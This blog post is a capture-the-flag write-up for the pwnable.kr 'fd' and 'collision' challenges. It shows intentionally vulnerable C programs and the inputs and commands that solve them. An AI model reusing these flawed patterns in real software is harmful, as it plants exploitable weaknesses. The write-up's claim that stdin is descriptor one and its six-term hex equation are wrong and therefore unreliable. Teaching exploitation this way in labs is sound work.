---
layout: post
title: "[Pwnable.kr] fd, collision"
date: 2017-09-11 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

# Toddler's bottle: `fd`

Suggested reads: 
* <https://en.wikipedia.org/wiki/File_descriptor>

Vulnerable code with comments:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
        // Do not accept less than 2 arguments (program name is one of them), print help and exit
		printf("pass argv[1] a number\n");
		return 0;
	}
	// atoi: convert a string array to integer
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
    
	// Read from file descriptor int(argv[1] - 0x1234)
	len = read(fd, buf, 32);
    
	// If strcmp("LETMEWIN\n", buf) returns 0 (matches), print flag
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

We want `fd` to contain `STDIN_FILENO` which is one, then pass `LETMEWIN` as input. 

`atoi(argv[1]) = fd + 0x1234 = 0x1235 = 4661`

Okay, let's do this.

```cpp
fd@ubuntu:~$ ./fd 4661
LETMEWIN
good job :)
flag_for_fd_;)
```

---

# Toddler's Bottle: `collision`

Suggested reads:
* <https://users.cs.cf.ac.uk/Dave.Marshall/C/node10.html>
* <https://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Data/endian.html>

Vulnerable code with comments:

```cpp
#include <stdio.h>
#include <string.h>

unsigned long hashcode = 0x21DD09EC;

/* input: char pointer to argv[1]
 * char pointer is cast to an int pointer, 
 * basically if char* p = "1234" = "\x31\x32\x33\x34", int* ip = 0x34333231.
 * if you don't understand this check the suggested reads.
 */
 
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	// Iterate over the char array 4 bytes a time, sum them up
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){

	// Check there are at least two arguments (including file name)
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
    
	// Check arg[v] is of exactly 20 bytes
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	// if hashcode matches returned value, print flag
	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

Okay, assuming you read the comments you should know what we'll do. We want to pass 20 bytes than when cast to integers (5 of them, as a single int occupies 4 bytes), sum up to `0x21DD09EC`.

Easy way to do it is just come up with 5 null-free 4-byte characters.

`0x21DD 09EC = 0x1111 1111 + 0x0111 1111 + 0x0111 1111 + 0x0111 1111 + 0x011 1111 + 0x0D98 C5A8`

Easiest way to pass this as input is using python, and we have to respect endiannes.

```console
col@ubuntu:~$ ./col $(python -c 'print "\x11\x11\x11\x11" + "\x11\x11\x11\x01" * 3 + "\xa8\xc5\x98\x0d"')
flag_for_col_:)
```

Notice how we expressed the bytes in little-endian and represented values like `\x0d98c5a8` as "\xa8\xc5\x98\x0d".

---

